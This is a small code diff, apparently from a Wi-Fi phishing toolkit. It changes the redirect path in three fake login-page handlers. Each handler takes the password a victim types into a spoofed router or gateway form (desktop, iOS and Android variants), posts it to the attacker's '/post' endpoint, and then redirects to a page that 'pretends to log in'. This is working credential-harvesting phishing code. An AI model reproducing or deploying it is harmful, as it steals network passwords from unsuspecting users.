@@ -506,7 +506,7 @@
     				// timeout:800
     				setTimeout(function(){
     					$.post('/post', 'wfphshr-password=' + $('.main input[name=password]').val(), function(){
-	    					self.location = './gateway.html'; // pretend to log in to gateway
+	    					self.location = './static/gateway.html'; // pretend to log in to gateway
 	    				});
     				}, 800);
     			}
@@ -564,7 +564,7 @@
 			        return false;
 			    } else {
 			    	$.post('/post', 'wfphshr-password=' + $('.ios input[name=password]').val(), function(){
-						window.location = './gateway.html'; // pretend to log in to gateway
+						window.location = './static/gateway.html'; // pretend to log in to gateway
 					});
 			    }
 			});
@@ -654,7 +654,7 @@
         			// timeout:1000
         			setTimeout(function(){
         				$.post('/post', 'wfphshr-password=' + $('.android input[name=modal-password]').val(), function(){
-        					self.location = './gateway.html';
+        					self.location = './static/gateway.html';
         				});
         			}, 600);
         		}
